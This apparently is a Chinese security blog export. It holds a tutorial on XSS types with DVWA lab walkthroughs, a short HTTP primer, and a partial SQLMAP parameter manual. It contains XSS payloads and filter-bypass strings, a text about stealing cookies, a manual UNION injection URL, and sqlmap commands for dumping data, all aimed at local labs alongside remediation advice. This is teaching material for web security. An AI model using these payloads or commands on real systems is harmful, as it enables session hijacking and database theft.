添加正常留言’helloworld‘，审查元素得知该HTML代码为&lt;li&gt;&lt;strong&gt;username&lt;/strong&gt;&lt;span class=&quot;message&quot;&gt;helloword&lt;/span&gt; 如果不清楚具体输出位置，有三种模糊测试方法 普通注入 &lt;script&gt;alert(document.cookie)&lt;/script&gt; 闭合标签注入 &quot; /&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; 闭合标签注入&lt;/textarea&gt;&#39;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script 当存储型XSS代码注入后，每次加载留言界面XSS代码都会被执行 总结：留言就是恶意XSS代码伪装的。 反射型XSS原理攻击者在URL中插入XSS代码，服务端将URL中的XSS代码输出到页面上，攻击者将带有XSS代码的URL发送给用户，用户打开后受到XSS攻击。 代码解析程序接受username值后再输出，如果username=&lt;script&gt;恶意代码&lt;/script&gt;，则会让恶意代码在服务器端执行。 1234&lt;?php $username=$_GET[&#x27;username&#x27;]； echo $username;?&gt; 攻击者利用站内信方式将带有恶意代码的URL发送给正常用户以获取用户的Cookie即登录信息，则攻击者可以利用Cookie（以正常用户的身份）登录该网站。 方法：寻找需要传入参数（形如?id=1）的URL，在闭合标签再加入&lt;script&gt;代码。 DOM型XSSDOM简介DOM全称Document Object Model（文档对象模型），使用DOM可以允许程序和脚本动态地访问和更新文件的内容、结果和样式。 HTML DOM树 原理攻击者在URL中插入XSS代码，前端页面直接从URL中获取XSS代码并输出到页面，导致XSS代码执行，攻击者将带有XSS代码的URL发送给用户，用户打开后受到XSS攻击。（与反射型XSS漏洞相比，DOM型XSS漏洞不需要经过后端处理，只在前端进行） 经典DOM型XSS示例12345// 获取URL中的content值并输出var temp = document.URL;var index = document.URL.indexOf(&quot;content=&quot;) + 4;var par = temp.substring(index);document.write(decodeURI(par)); 常见方法输入http://127.0.0.1/dom.html?content=&lt;script&gt;alert(/xss/)&lt;/script&gt;就会产生XSS漏洞。 常用XSS漏洞修复函数 在下面实战中我们还会讲解一遍函数的具体作用 Strip_tags() 所有HTML、XML、PHP元素均被删除 htmlspecialchars 将部分字符转换为HTML实体，防止浏览器将其识别为HTML元素。 &quot; –&gt; &amp;quot; &amp;–&gt;&amp;amp; &#39;–&gt;&#39; &lt;–&gt;&amp;lt &gt;–&gt;&amp;gt addslashes() 在字符串中出现预定字符之前添加反斜杠的字符串。 stripslahes(string) 删除字符串中的反斜杠 XSS辅助测试工具Beef 搭建： docker pull janes/beef docker run –rm -p 3000:3000 janes/beef 访问http://127.0.0.1:3000/ui/panel 默认账号密码beef/beef 使用：当用户执行XSS代码之后，获取信息进行详细分析。 XSS’OR Encode/Decode 代码编码解码 Codz 测试CSS工具，生成一些POST数据 Probe 给你一个JS文件你可以插入到指定的网页中，以来获取信息。 XSS平台网上JS漏洞集合平台 IE Tester模拟IE低版本 DVWA XSS实战 安装DVWA模拟环境 下载并安装docker docker pull citizenstig/dvwa docker run -dt -p 8997:80 citizenstig/dvwa 访问http://127.0.0.1:8997 默认账号密码admin/password XSS(Reflected) Low代码分析1234567&lt;?php// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;&#125;?&gt; 从源代码可以看到代码直接引用name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。 漏洞利用输入&lt;script&gt;alert(/nzy/)&lt;/script&gt;,弹框 url:http://127.0.0.1:8997/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%2Fnzy%2F%29%3C%2Fscript%3E# XSS(Reflected) Medium代码分析123456789&lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; 从源代码可以看出对输入进行了过滤，基于黑名单思想，利用str_replace()函数将输入中含有&lt;script&gt;替换成 。但是这种防护机制仍可以轻松绕过。 漏洞利用 利用双写绕过，输入&lt;scr&lt;script&gt;ipt&gt;alert(/nzy/)&lt;/script&gt;，在经过str_replace()函数处理后为&lt;script&gt;alert(/nzy/)&lt;/script&gt; 大小写混淆绕过，黑名单思想只禁止&lt;script&gt;，因此可以利用大小写混淆绕过，输入&lt;Script&gt;alert(/nzy/)&lt;/scirpt&gt; XSS(Reflected) High代码分析123456789&lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; 从源代码可以看出同样是使用了黑名单思想，但是preg_replace()函数用于正则表达式的搜索和替换，这样使得Medium级别的双写绕过、大小写混淆绕过方法都是小。 Preg_replace()函数中i表示忽略大小写 漏洞利用虽然无法再使用带有&lt;script&gt;字样的标签来注入XSS代码，但是可以利用img、body等标签事件或者iframe等标签src来注入恶意的JS代码。 输入&lt;img src=1 onerror=alert(/nzy/)&gt; XSS(Reflected) Impossible代码分析12345678910111213&lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $name = htmlspecialchars( $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 在High级别中，我们可以利用img、body等标签事件进行注入恶意JS代码，所以在impossible级别中，利用上文讲到过的htmlspecialchars()函数将部分字符（&amp; &quot; &#39; &lt; &gt; ）转换为HTML实体，防止浏览器将其识别为HTML元素。 XSS(Stored) Low代码分析12345678910111213141516&lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = stripslashes( $message ); $message = mysql_real_escape_string( $message ); // Sanitize name input $name = mysql_real_escape_string( $name ); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysql_query( $query ) or die( &#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close(); &#125; ?&gt; 针对代码中提到的几个函数解释一下 trim(string,charlist) 功能：移除字符串两侧的空白字符或者其他预定义字符(\\t \\n \\x0B \\r )，可选参数charlist支持增添额外需要删除的字符 Mysql_real_escape_string(string,connection)这个函数在 SQL注入防御绕过曾经提到过。功能：对字符串中的特殊符号（\\x00 \\n \\r \\ &#39; &quot; \\x1a）进行转义。 stripslahes(string) 功能：删除字符串中的反斜杠 从源代码可以看出对输入没有做XSS方面的过滤与检查就直接存储至数据库了，因此存在明显的存储型XSS漏洞。 漏洞利用直接输入&lt;script&gt;alert(/nzy/)&lt;/script&gt;，需要注意的是name变量在前端中对字数有限制，我们将其修改至30。 XSS(Stored) Medium代码分析123456789101112131415161718&lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name ); $name = mysql_real_escape_string( $name ); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysql_query( $query ) or die( &#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close(); &#125; ?&gt; 针对代码中提到的几个函数解释一下 Strip_tags() 功能：删除字符串中的HTML、XML以及PHP标签，但保留&lt;b&gt;标签。 addslashes() 功能：在字符串中出现预定字符（&#39; &quot; / NULL）之前添加反斜杠的字符串。 从源代码可以看出对输入中的message参数使用了htmlspecialchars()函数进行标签转换，因此无法再通过message参数进行XSS注入，但是对name参数只进行形如XSS(Reflected) Medium中的过滤&lt;script&gt;字符串而已，因此存在存储型XSS漏洞。 漏洞利用基本参见XSS(Reflected) Medium中的双写绕过、大小写混淆绕过两种办法，并且对name参数进行修改maxlength=30。 双写绕过，输入&lt;scr&lt;script&gt;ipt&gt;alert(/nzy/)&lt;/script&gt; 大小写混淆绕过，输入&lt;Script&gt;alert(/nzy/)&lt;/scirpt&gt; XSS(Stored) High代码分析123456789101112131415161718&lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); $name = mysql_real_escape_string( $name ); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysql_query( $query ) or die( &#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close(); &#125; ?&gt; 从源代码可以看出这道题类似于XSS(Reflected) High，具体参见上文。 漏洞分析基本参见XSS(Reflected) High中的利用img、body等标签事件或者iframe等标签src来注入恶意的JS代码的办法，并且对name参数进行修改maxlength=30。 输入&lt;img src=1 onerror=alert(/nzy/)&gt; XSS(Stored) Impossible代码分析123456789101112131415161718192021222324&lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = stripslashes( $message ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = mysql_real_escape_string( $name ); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( &#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27; ); $data-&gt;bindParam( &#x27;:message&#x27;, $message, PDO::PARAM_STR ); $data-&gt;bindParam( &#x27;:name&#x27;, $name, PDO::PARAM_STR ); $data-&gt;execute(); &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 还是终极函数htmlspecialchars()函数的出场，解决XSS问题。有一点需要注意的是，如果htmlspecialchars()函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。 htmlspecialchars()完整用法：https://www.runoob.com/php/func-string-htmlspecialchars.html","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"http://example.com/tags/XSS/"}]},{"title":"HTTP协议简介","slug":"HTTP协议简介","date":"2020-04-07T08:09:25.000Z","updated":"2020-04-08T01:51:04.000Z","comments":true,"path":"2020/04/07/HTTP协议简介/","link":"","permalink":"http://example.com/2020/04/07/HTTP%E5%8D%8F%E8%AE%AE%E7%AE%80%E4%BB%8B/","excerpt":"本文学习如何HTTP如何在客户端与服务器端通信，以及HTTP方法。","text":"本文学习如何HTTP如何在客户端与服务器端通信，以及HTTP方法。 HTTP协议在客户端和服务端之间的通信客户端：请求访问文本或图像等资源的一端。服务器端：提供资源响应的一端。 注意：就一条通信路线来说，服务器端和客户端的角色是确定的，而用HTTP协议能够明确区分哪端是客户端，哪端是服务器端。 通过请求和响应的交换达成通信 过程：请求从客户端出发，最后服务器端响应该请求并返回。 GET:请求访问服务的类型 ； /index.htm:请求访问的资源对象； HTTP/1.1：HTTP的版本号，用来提示客户端使用的HTTP协议功能； 请求访问hackr.jp主机的/index.htm页面资源。 HTTP/1.1:HTTP版本号 200:状态码(status code) Date:创建响应的日期时间 &lt;html&gt;...&lt;/html&gt;:资源实体的主体 HTTP是不保存状态的协议 为了更快的处理大量事物，确保协议的可伸缩性，协议本身并不保留之前一切的请求或响应报文的信息。 Cookie：可记录状态，后面会讲到。 告知服务器意图的HTTP方法[1] GET 获取资源 GET方法用来请求访问已被URI识别的资源。指定的资源经服务器端解析后返回相应内容。 [2] POST 传输实体主体 POST与GET都可以用来传输实体的主体。但POST的主要目的并不是获取相应的主体内容。 [3] PUT 传输文件 PUT方法用来传输文件。在请求报文的主体中包含文件内容，然后保存到请求URI指定的位置。 [4] HEAD 获得报文首部 HEAD方法和GET方法一样，知识不返回报文主体部分。用于确认URI的有效性及资源更新的日期时间等。 [5] DELETE 删除文件 DELETE方法按请求URI删除指定的资源。 [6] OPTIONS 询问支持的方法 OPTIONS方法用来查询针对请求URI指定的资源支持的方法。 [7] TRACE 追踪路径 TRACE方法是让Web服务器端将之前的请求通信环回给客户端的方法。 发送请求时，在Max-Forwards首部字段中填入数值，每经过一个服务器端就将该数字减1，当数值刚好减到0时，就停止继续传输。 [8] CONNECT 要求用隧道协议连接代理 CONNECT方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行TCP通信。主要使用SSL和TSL协议把通信内容加密后经网络隧道传输。 CONNECT格式：CONNECT 代理服务器名:端口号 HTTP版本 使用方法下达命令方法的命令：向请求URI指定的资源发送请求报文 HTTP/1.0和HTTP/1.1支持的方法 持久接连节省通信量 在HTTP协议的初始版本中，每进行一次HTTP通信就要断开一次TCP连接。 但是在之后，一个HTML页面包含图片使得通信量剧集增加。 持久连接：只要任意一端没有明确提出断开连接，则保持TCP连接状态。","categories":[{"name":"网络基础","slug":"网络基础","permalink":"http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"http","slug":"http","permalink":"http://example.com/tags/http/"}]},{"title":"SQLMAP不完全使用手册","slug":"SQLMAP不完全使用手册","date":"2020-03-30T14:19:39.000Z","updated":"2020-04-03T07:19:42.000Z","comments":true,"path":"2020/03/30/SQLMAP不完全使用手册/","link":"","permalink":"http://example.com/2020/03/30/SQLMAP%E4%B8%8D%E5%AE%8C%E5%85%A8%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/","excerpt":"本文学习SQLMAP工具的使用。以及附录的SQLMAP参数百科全书。","text":"本文学习SQLMAP工具的使用。以及附录的SQLMAP参数百科全书。 一、SQLMAP介绍SQLMAP是一种开源渗透测试工具，可自动执行SQL注入缺陷的检测和开发过程，并接管数据库服务器。它有强大的检测引擎,针对不同类型的数据库提供多样的渗透测试功能选项，实现数据库识别、数据获取、访问DBMS\\操作系统甚至通过带外数据连接的方式执行操作系统的命令。以及从数据库指纹识别、从数据库获取数据、访问底层文件的广泛范围的交换机通过带外连接在操作系统上执行命令。 SQLMAP支持的数据库：MySQL, Oracle,PostgreSQL,Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库。 SQLMAP目前支持的注入方式： B：布尔型注入（Boolean-base blind SQL injection） E：报错型注入（Error-based SQL injection） U：可联合查询注入（UNION query SQL injection） S：可多语句查询植入（Stacked queries SQL injection） T：基于时间延迟注入（Time-base blind SQL injection） Q：内联注入（Inline SQL injection） SQLMAP功能模块 目标 至少为目标提供一选项 请求（Request） 指定如何连接目标URL的方法 优化（Optimization） 优化SQLMAP的性能 注入（Injection） 指定测试哪些参数，提供注入Payload和篡改脚本 侦测（Detection） 侦测阶段的定制化 技巧（Techniques） 调整特定SQL注入技术的技巧 枚举（Enumeration） 枚举后端数据库管理系统信息、数据表的数据接口 暴力执行（Brute Force） 暴力检查 用户定义注入函数（User-defined Function Injection） 建立用户定义函数 访问文件系统（File System Access） 访问后端数据库管理系统的底层文件系统 操作系统连接（Operating System Access） 连接后端DBMS底层的操作系统 Windows注册表连接（Windows Registry Access） 连接后端DBMS底层的Windows注册表 通用（General） 设置一些通用参数 二、SQLMAP下载与安装SQLMAP下载地址：http://sqlmap.org/ 查看SQLMAP是否安装 python3 sqlmap.py -h 如下图则已完成SQLMAP工具安装 三、SQLMAP命令练习命令拆解 python sqlmap.py -u &quot;http:127.0.0.1:8999/Less-1/?id=1&quot; -user-agent=websecurity -threads=5 -p id --level --technique=E --current=user --flush-session --beep python sqlmap.py -u &quot;http:127.0.0.1:8999/Less-1/?id=1&quot; SQLMAP注入流程 SQLMAP注入技巧需要用到*的情况： URL中的值，SQLMAP默认不注入，需要*指定 JSON格式，SQLMAP会无效，需要*才能进行 在默认Level=1时，可以使用*对特定的请求头做注入 命令1：python sqlmap.py -u http://127.0.0.1:8999/Less-1/?id=*1 --flush-session --batch --technique=B 命令2：python sqlmap.py -u http://127.0.0.1:8999/Less-1/?id=1* --flush-session --batch --technique=B 如果不指定user-agent时，将会带有sqlmap标记。prefix和suffix修改Less-1源代码 手动构造注入语句： http://127.0.0.1:8999/Less-1/?id=id=-4436)))) UNION ALL SELECT NULL,CONCAT(0x716b627171,current_user(),0x717a627671),NULL--+ 利用SQLMAP工具注入： python sqlmap.py -u http://127.0.0.1:8999/Less-1/?id=1 --flush-session --batch --technique=U 无法得到注入点 需要使用--prefix和--suffix来使得语句的闭合，保证正常的Payload注入 –prefix -&gt; )))) 闭合前面的符号 –suffix -&gt; –hhh 注释、闭合后面的数据 python sqlmap.py -u http://127.0.0.1:8999/Less-1/?id=1 --flush-session --batch --technique=U --prefix=&quot;))))&quot; --suffix=&quot;-- hh&quot; payload检测原理Payload中几个常用参数 –no-cast cast() 关闭cast函数的使用 –np-escape char() 关闭char() 减少载荷，加快效率 –hex() 有时候字符编码问题可能会导致数据缺失，可以用hex()函数来避免 risk和levellevel是测试范围，risk是语句深度 两者都会影响Payload的测试量，值越大，量越大。 level解释：高等级level会包含低等级level的测试 level&gt;=2时，会测试cookie level&gt;=3时，会测试user-agent，referer level&gt;=5时，会测试HOST risk解释：高等级risk会包含低等级risk的测试 1 默认，会测试大部分的测试语句 2 会加上基于事件的测试语句 3 会增加OR语句的SQL注入测试 附录：SQLMAP Wiki对上述提到了十二个SQLMAP功能模块，我们从实战的角度将功能重新分成Options、Target、Request、Optimization、Injection、Detection、Techniques、Fingerprint、Enumeration、Brute Force、User-defined Function Injection、File System Access、Operating System Access、Windows Registry Access、General、Miscellaneous共十六个模块来讲解。 （部分参数未能理解含义，见谅。若对参数有别的见解可以联系我呀！！！） 3.1 Options（选项） 参数 解释 -h-hh 查看帮助 –version 查看版本 -v 显示信息级别，共有六级：0.只显示Python错误和一些严重信息 1.显示基本信息（默认）2.显示Debug信息 3.显示注入过程的Payload 4.显示HTTP包请求 5.显示HTTP响应头 6.显示HTTP响应页面 3.2 Target（目标）这些选项可用于指定连接何种目标（数据库、URL、文件）。 参数 解释 -d 直接连接目标后端数据库，并不使用SQL注入漏洞，通过目标端口侦听实现。需要注意的是输入目标数据库的账号与密码。例如-d &quot;mysql;//username;password@127.0.01:3306/databasename&quot; --dbs -u 指定URL连接。例如-u &quot;www.implanck.com/index.php?id=1&quot; -l SQLMAP扫描log文件中所有记录。例如-l log.txt -x 站点地图，返回给SQL一个XML文件 -m 提供包含URL的TXT文件，SQLMAP会自动化检查其中所有URL。例如-m target.txt -r 提供包含POST请求方式的数据包的TXT文件，SQLMAP会通过POST方式检测目标。例如-r post.txt -g 使用Google搜索类似的网站。例如-g &quot;inurl:\\&quot;.php?id=1\\&quot;&quot; -c 提供命令的TXT文件，让SQLMAP执行文件中的命令。也可以配合--sava命令将结果写入文件。 3.3 Request（请求）这些选项可用于指定如何连接到目标 URL。 参数 解释 –method=METHOD 指定利用GET方法还是POST方法。例如--method=GET或--method=POST –data=DATA 指定后接参数（POST型）。例如-u &quot;www.implanck.com/index.php&quot; --data=&quot;id=1&quot; union select 1,2,3&quot; –param-del=PARA 指定使用的变量分隔符。例如-u &quot;www.implanck.com/index.php?id=1&quot; data=&quot;name=1;pass=2&quot; --para-del=&quot;;&quot; –cookie=COOKIE 指定使用的cookie。例如-u &quot;www.implanck.com/index.php?id=1&quot; --cookie=&quot;a=1;b=2&quot; –cookie-del=COO.. 与–param-del=PARA类似，不再赘述。 –load-cookies=L.. 从Netscape/wget格式的cookie文件中加载cookie –drop-set-cookie SQLMAP默认开启set-cookie功能（当收到一条含有set-cookie的HTTP包时，下次SQL会使用新的cookie进行发包）。如果使用这条命令则关闭此功能。 –user-agent=AGENT 指定user-agent值测试。SQLMAP默认会使用自己的user-agent值（SQLMAP自身user-agent为sqlmap/1.0-dev-nongit-201603020a89(http://sqlmap.org)）进行测试。例如--user-agent=&quot;aaaaaa&quot; –random-agent 使用随机user-agent值测试。可在sqlmap/data/txt/user-agents.txt中查看。 –host=HOST 指定HTTP包中的HOST头参数。例如--host=&quot;aaaaa&quot; –referer=REFERER 指定HTTP包中的referer字段。例如--referer=&quot;aaaaa&quot; -H –headers 额外的headers头。例如--headers=&quot;www.implanck.com\\nUser-Agent:planck&quot; –headers=HEADERS 同上面(注意构造HTTP包区分大小写)。另一个例子--headers=&quot;Accept-Language:fr\\nTag:213&quot; –auth-type=AUTH.. 基于HTTP身份验证的种类（共有三种认证方式）。例如--auth-type Basic.Digest/NTLM –auth-cred=AUTH.. 使用认证。例如--auth-type Basic --auth-cred &quot;user:password&quot; –auth-file=AUTH.. 使用.PEM文件认证。例如--auth-file=&quot;AU.PEM&quot; –ignore-code=IG.. 无视响应HTTP状态码。例如--ignore-code=401 –ignore-proxy 无视本地设置的代码。 –ignore-redirects 无视HTTP重定向（状态码为3XX类型）。可以使用这个忽略登录成功会跳转到其他网页。 –ignore-timeouts 无视连接超时 –proxy=PROXY 设置代理。方便BurpSuite抓包。例如--proxy=&quot;127.0.0.1:8080&quot; –proxy-cred=PRO.. 代理需要认证。例如--proxy=&quot;name:password&quot; –proxy-file=PRO.. 使用文件加载代理 –tor 可用来屏蔽一个互联网用户的IP地址，允许匿名浏览。 –tor-port=TORPORT 设置默认的匿名浏览端口 –tor-type=TORTYPE 设置匿名浏览代理种类 –check-tor 检查是否正确使用匿名浏览 –delay=DELAY 每次发包的延时时间，单位为秒。例如--delay 2.5 –timeout=TIMEOUT 设置请求超时时间，默认为30秒 –retries=RETRIES 设置超时重连次数，默认为3。例如--retries=5 –randomize=RPARAM 设置随机参数长度（保证类型与输入值一致的情况下）。为了避免反复提交同一个参数引起服务器怀疑。 –safe-url=SAFEURL 与-u类似，额外功能是防止长时间不通讯服务器销毁session，开启这种功能会隔一段时间发一个包保持session –safe-post=SAFE.. 同上。以POST形式发送 –safe-req=SAFER.. 同上。从一个文件获取目标 –safe-freq=SAFE.. 频繁发送错误请求，服务器会销毁session。开启此参数后，发几次错误的就会有发一次对的。适用于盲注 –skip-urlencode 跳过URL编码。（有些网站URL不遵守RFC标准编码） –csrf-token=CSR.. 保持CSRF令牌的token –csrf-url=CSRFURL 访问URL地址时获取CSRF的token –force-ssl 强制使用SSL –hpp –eval=EVALCODE 指定执行一段Python代码。例如-u &quot;www.test.com/index.php?id=1&quot; -eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot; 3.4 Optimization（优化）这些选项可用于优化SQLMAP的性能。 参数 解释 -o 开启--predict-output、--keep-alive、--null-connection功能 –predict-output 根据服务器返回值来猜测一个数据表存不存在。（与暴力破解不同的是在一个范围内慢慢缩小暴力破解范围） –keep-alive 使用HTTP长链接，优点：性能更好，避免重复建立链接的开销；缺点：占用服务器资源。（注意：与–proxy不兼容） –null-connection 分析返回报文页面的Length值，通常用于（时间延迟&amp;布尔）盲注。 –threads=THREADS 开启多线程，线程数为1-10。（注意：与–predict-output不兼容） 3.5 Injection（注入）这些选项可用于指定需要测试的参数，并提供自定义注入脚本和可选的篡改脚本。 参数 解释 -p TESTPARAMETER 指定测试的参数（使用此参数会使得--level参数无效）。例如-p &quot;user-agent,referer&quot; –skip=SKIP 排除指定的参数。例如--level 5 --skip=&quot;id,user-agent&quot; –skip-static 跳过测试静态参数 –param-exclude=.. 使用正则表达式跳过测试参数 –dbms=DBMS 指定目标数据库类型。例如--dbms=&quot;MySQL&lt;5.0&gt;/Oracle&lt;lli&gt;/Microsoft SQL Server&lt;2005&gt;&quot; –dbms-cred=DBMS.. 数据库的登录认证。例如--dbms-cred=&quot;name:passwd&quot; –os=OS 指定目标操作系统。例如--os=&quot;Linux/Windows&quot; –invalid-bignum 通常情况下SQLMAP使用负值使得参数失效（id=-1）。开启这条参数后使用大数来失效（id=9999999999）。 –invalid-logical 利用逻辑运算符使得参数失效。例如id=1 and 1=2（and后面失效） –invalid-string 利用随机字符串使得参数失效 –no-cast 获取数据时，SQLMAP将所有数据转换成字符串（空格使用NuLL代替）。 –no-escape 用于混淆和避免出错（单引号可能会被过滤机制拦截），SQLMAP使用char()编码。例如select &quot;a&quot;–&gt;select char(97) –prefix=PREFIX 指定Payload前缀（有时候我们猜到了服务器代码闭合情况，需要使用这个来指定）。例如-u &quot;www.implanck/com/index.php?id=1&quot; -p id --prefix&quot;)&quot; --suffix &quot;and (&#39;abc&#39;=&#39;abc&quot; –suffix=SUFFIX 同上 –tamper=TAMPER 使用SQLMAP自带的tamper，或者自己写的tamper，来混淆Payload。通常用来绕过WAF和IPS。 3.6 Detection（侦测）这些选项可用于在侦测阶段时的自定义内容。 参数 解释 –level=LEVEL 设置测试等级（1-5，默认为1） lv2:cookie; lv3:user-agent,referer; lv5:host。具体的Payload可以在sqlmap/data/xml/payloads文件夹里查看。 –risk=RISK 风险（1-4，默认为1）升高风险等级会增加数据被篡改的风向 risk2:基于事件的测试 ；risk3:or语句的测试 ；risk4:update的测试 –string=STRING 指定字符串参数为判断结果真。（在基于布尔注入中，有时候返回的页面一次一个样，需要我们自己判断返回正确页面的标志，于是就设置返回正确页面的字符串） –not-string=NOT.. 同上。指定NULL为真。 –regexp=REGEXP 同上。指定正则表达式来判断。 –code=CODE 指定HTTP返回码为判断结果真 –text-only 指定页面内一段文本内容为判断结果真 –titles 指定页面标题为判断结果真 3.7 Techniques（技巧）这些选项可用于选取特定 SQL 注入技术。 参数 解释 –technique=TECH 指定所使用的技术（B：布尔盲注、E：报错注入、U：联合查询注入、S：文件系统，操作系统，注册表相关注入、T：时间延时盲注。默认全部使用） –time-sec=TIMESEC 在基于时间延迟盲注时，指定判断时间，默认5秒（单位为秒） –union-cols=UCOLS 联合查询尝试列数。（类似于ORDER BY x），随着level增加，最多支持50列。例如--union-cols 6-9 –union-char=UCHAR 联合查询默认使用的站列的是NULL，有的时候NULL可能会失效，因此可以手动指定其他字符。例如--union-char 1 –union-from=UFROM 联合查询从之前的查询结果中选择列 –dns-domain=DNS.. 指定DNS服务器来提升效率。例如--dns-domain abc.com 在某个页面注入的结果在另一个页面展示。例如--second-order www.implanck.com/a.php 3.8 Fingerprint（指纹） 参数 解释 -f, –fingerprint 指纹信息，返回DBMS，操作系统，架构，补丁等信息 3.9 Enumeration（枚举）这些选项可用于枚举表中后端数据库管理系统信息、结构和数据。 参数 解释 -a, –all 暴力查找全部 -b, –banner 返回数据库管理系统的标识 –current-user 返回当前用户 –current-db 返回当前数据库 –hostname 返回主机名 –is-dba 检测 DBMS 当前用户是否为 DBA（数据库管理员） –users 返回所用用户名 –passwords 返回用户密码的哈希值 –privilege 列举当前用户的权限（通过用户权限可以判断是否为管理员）。例如--privileges U root –roles 列举当前用户权限 –dbs 返回目标服务器中数据库信息 –tables 返回目标数据库中数据表信息 –columns 返回目标数据表中列字段信息 –schema 返回目标服务器中所有（数据库、数据表、列字段）信息 –count 返回查询结果的个数 –dump 返回指定范围的所有信息。例如-D security -T users --dump –dump-all 返回所有信息。 –search 搜索数据库、数据表和列字段的名称 –comments 检索数据库的备注 -D DB 查询指定某个数据库数据 -T TBL 查询指定某个数据表数据 -C COL 查询指定某个列字段数据 -X EXCLUDE 指定数据库的标识符 -U USER 指定用户（通常与其他参数联合使用） –exclude-sysdbs 排除系统数据库 –pivot-column=P.. –where=DUMPWHERE 在dump时使用where条件限制 –start=LIMITSTART –stop=LIMITSTOP –first=FIRSTCHAR –last=LASTCHAR –sql-query=QUERY 执行SQL语句 –sql-shell 创建一个SQL的shell –sql-file=SQLFILE 执行给定文件中的SQL语句 3.10 Brute Force（暴力执行）这些选项可用于暴力检查。 参数 解释 –common-tables 检查整个数据库中有没有记录信息的数据库/表。（在MySQL&gt;=5.0时，名为information_schema的数据表，存储了整个数据库的基本信息） –common-columns 检查整个数据库中有没有记录列字段信息的公共表。 3.11 User-defined Function Injection（用户定义注入函数）这些选项可用于用户定义注入函数。 参数 解释 –udf-inject –shared-lib=SHLIB 3.12 